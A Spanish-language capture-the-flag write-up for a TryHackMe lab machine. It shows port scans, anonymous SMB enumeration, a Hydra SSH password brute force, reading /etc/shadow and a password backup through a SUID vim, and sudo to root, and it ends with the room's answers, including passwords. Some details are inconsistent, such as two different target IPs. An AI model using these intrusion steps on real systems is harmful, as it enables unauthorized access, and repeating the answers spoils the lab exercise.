# All in One - TryHackMe

- Objetivo: Obtener acceso al sistema y escalar privilegios hasta root.
- Fecha: 12/06/2025
- Autor del reto: Liiaam251
- Enlace a la máquina: [https://tryhackme.com/room/allinonemj](https://tryhackme.com/room/allinonemj)
- IP de la máquina: 10.10.135.37

## Enumeración de puertos con Nmap

````bash
sudo nmap -sVC -sS -p- -Pn -T4 10.10.244.192
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-14 06:22 EDT
Nmap scan report for 10.10.244.192
Host is up (0.061s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2025-06-14T06:23:45-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-06-14T10:23:45
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
````
Vemos que hay un http, vamos a lanzar gobuster 

## Buscar subdirectorios - Gobuster
````bash
gobuster dir -u http://10.10.244.192 -w subdomains-top1million-110000.txt -x php,js,html -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.192
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                subdomains-top1million-110000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.10.244.192/development/]
/index.html           (Status: 200) [Size: 158]

````
Encontramos la task3
````
/development
````
Dentro de este directorio, vemos que hay dos personas hbaoando sobre que tienen un smbclient, aparte en el nmap ya lo habíamos visto así que vamos a lanzar enum4linux para ver si vemos algo interesante 
## SMBCLIENT

vamos a ver que tienen yo he usado este coamndo para listar contenidos dentro de esa IP
````
smbclient -L 10.10.244.192                   
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BASIC2
````
vamos a usar sql map para ver a que archivos puedo acceder: 
````
mbmap -H 10.10.244.192 -u Anonymous       

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap
[+] IP: 10.10.244.192:445       Name: 10.10.244.192             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba Server 4.3.11-Ubuntu)
````
tenemos acceso de lectura a este archivo compartido vamos a ver que  hay dentro 

yo he usado este comando: 
````
smbclient //10.10.244.192/Anonymous -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 13:31:20 2018
  ..                                  D        0  Thu Apr 19 13:13:06 2018
  staff.txt                           N      173  Thu Apr 19 13:29:55 2018
````
El parametro -N es para acceder sin usuario ni contraseña
Vamos a descargar staff.txt con 
````
get staff.txt
````
````
cat staff.txt
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
````
tenemos dos posibles usuarios, podemos lanzar un hydra o al ssh o al smb client, voy a intentar primero el ssh ya que es más importante
Añadir que nos podriamos haber ahorrado esta enumeracion de smbclient con la herramienta enum4linux:
````
$ enum4linux 10.10.244.192 -a
...
Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\kay (Local User)                                                                            
S-1-22-1-1001 Unix User\jan (Local User)
....
````
Aqui tenemos los dos usuarios, vamos a lanzar un hydra con los dos users
````
hydra -t 64 -l kay -P rockyou.txt 10.10.244.192 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-14 07:02:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
[DATA] attacking ssh://10.10.244.192:22/
[ERROR] could not connect to ssh://10.10.244.192:22 - Socket error: disconnected
````
kay me da error voy a probar jan
````
 hydra -t 64 -l jan -P rockyou.txt 10.10.244.192 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-14 07:02:07
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
[DATA] attacking ssh://10.10.244.192:22/
[STATUS] 704.00 tries/min, 704 tries in 00:01h, 14343743 to do in 339:35h, 15 active
[22][ssh] host: 10.10.244.192   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-14 07:03:32
````
## Escalada de Privilegios - SUID
````
ssh jan@10.10.244.192            
The authenticity of host '10.10.244.192 (10.10.244.192)' can't be established.
ED25519 key fingerprint is SHA256:XKjDkLKocbzjCch0Tpriw1PeLPuzDufTGZa4xMDA+o4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.244.192' (ED25519) to the list of known hosts.
jan@10.10.244.192's password: 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@basic2:~$
````
Ya somos jan ahora a escalar priv
Hemos buscado binarios que podemos ejecutar como sudo -l pero no hay nada, vamos a ver con Busqueda de SUID
````
jan@basic2:~$ find / -perm -4000 2>/dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
....
jan@basic2:~$ 
````
Buscamos en el gtfobins, pero los suid con vim son para version de python 3, he mirado la version con:
````
jan@basic2:~$ python -V
Python 2.7.12
````
No es python3, vim también se usa como editor de contenido vamos a ver si podemos ver el shadow con esto ya que la máquina tiene crackhashes
:
````
/usr/bin/vim.basic /etc/shadow
````
Y nos da 
````
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
````
Pero no me funciona, despues dentro de la carpeta he visto dos cosas interesantes un id_rsa y un pass.bak el cual he abuerto haciendo:
````
jan@basic2:/home/kay$ /usr/bin/vim.basic pass.bak
````
Entonces con un dencillo su kay he entrado 
````
su kay
````
Después de esto he realizado
````
kay@basic2:~$ sudo -l
[sudo] password for kay: 
Sorry, try again.
[sudo] password for kay: 
Sorry, try again.
[sudo] password for kay: 
Matching Defaults entries for kay on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kay may run the following commands on basic2:
    (ALL : ALL) ALL
````
Tiene todos los permidos entonces:
````
kay@basic2:~$ sudo su root
root@basic2:/home/kay# whoami
root
root@basic2:/home/kay#
````
Un escalado muy sencillo ahora ha hacer las tascas
## Task Web App Testing and Privilege Escalation 

5. What is the username?
````
jan
````
5. What is the password?
````
armando
````
6. What service do you use to access the server(answer in abbreviation in all caps)?
````
ssh
````
8. What is the name of the other user you found(all lower case)?
````
kay
````
10. What is the final password you obtain?
````
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
````




